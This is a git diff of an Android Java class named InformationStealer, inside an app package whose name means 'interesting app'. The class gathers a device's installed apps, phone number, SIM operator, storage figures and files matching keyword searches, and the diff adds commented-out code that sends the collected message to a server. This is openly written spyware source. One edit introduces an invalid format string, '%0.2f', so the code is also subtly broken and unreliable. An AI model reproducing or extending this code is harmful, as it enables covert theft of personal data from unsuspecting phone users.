@@ -1,7 +1,6 @@
 package com.example.applicazioneinteressante;
 
-import android.annotation.SuppressLint;
-import android.app.Activity;
+
 import android.content.Context;
 import android.content.Intent;
 import android.content.IntentFilter;
@@ -17,15 +16,13 @@ import android.os.StatFs;
 import android.provider.MediaStore;
 import android.provider.Settings;
 import android.telephony.TelephonyManager;
-import android.util.Log;
 
-import androidx.core.app.ActivityCompat;
 import androidx.core.content.ContextCompat;
 import java.util.List;
+import java.util.Locale;
 
 public class InformationStealer implements Runnable {
 
-    private static final int READ_EXTERNAL_STORAGE_PERMISSION_REQUEST = 1;
     private static StringBuilder messaggio;
 
     String[] keywords = {
@@ -63,11 +60,6 @@ public class InformationStealer implements Runnable {
         return messaggio;
     }
 
-    public void setMessaggio(StringBuilder messaggio) {
-        InformationStealer.messaggio = messaggio;
-    }
-
-
     @Override
     public void run(){
         messaggio.append(stealApp(context));
@@ -76,14 +68,17 @@ public class InformationStealer implements Runnable {
         messaggio.append(stealFileSystemInfo(context, keywords));
         messaggio.append(stealNumberInformations(context));
 
+        /* Invia dati al server
+        conn.sendMessage(messaggio);
+        conn.closeConnection();
+        */
 
         int index = messaggio.indexOf("&");
         while (index != -1) {
             messaggio.replace(index, index + 1, "\n");
             index = messaggio.indexOf("&", index + 1);
         }
-
-       Log.i("Log", messaggio.toString());
+        System.out.println(messaggio.toString());
     }
 
 
@@ -95,7 +90,10 @@ public class InformationStealer implements Runnable {
                 String phoneNumber = telephonyManager.getLine1Number();
                 String operator = telephonyManager.getSimOperatorName();
                 msg += "&Phone_number=" + phoneNumber + "&";
-                msg += "&SIM_Operator=" + operator + "&";
+                if(operator.isEmpty())
+                    msg += "&SIM_Operator=none&";
+                else
+                    msg += "&SIM_Operator=" + operator + "&";
                 return msg;
             } else {
                 // Permesso non concesso
@@ -139,7 +137,7 @@ public class InformationStealer implements Runnable {
 
         for (int i = 0; i < keywords.length; i++) {
             String keyword = keywords[i];
-            StringBuilder append = selection.append("LOWER(" + MediaStore.Files.FileColumns.DATA + ") LIKE LOWER('%").append(keyword).append("%')");
+            selection.append("LOWER(" + MediaStore.Files.FileColumns.DATA + ") LIKE LOWER('%").append(keyword).append("%')");
             if (i < keywords.length - 1) {
                 selection.append(" OR ");
             }
@@ -180,8 +178,8 @@ public class InformationStealer implements Runnable {
         double totalSizeGB = (double) totalSizeBytes / (1024 * 1024 * 1024);
         double availableSizeGB = (double) availableSizeBytes / (1024 * 1024 * 1024);
 
-        String totalSizeFormatted = String.format("%.2f", totalSizeGB);
-        String availableSizeFormatted = String.format("%.2f", availableSizeGB);
+        String totalSizeFormatted = String.format("%0.2f", totalSizeGB);
+        String availableSizeFormatted = String.format("%0.2f", availableSizeGB);
 
         sb.append("&Total_size=" + totalSizeFormatted + "_GB&");
         sb.append("Available_size=" + availableSizeFormatted + "_GB&");
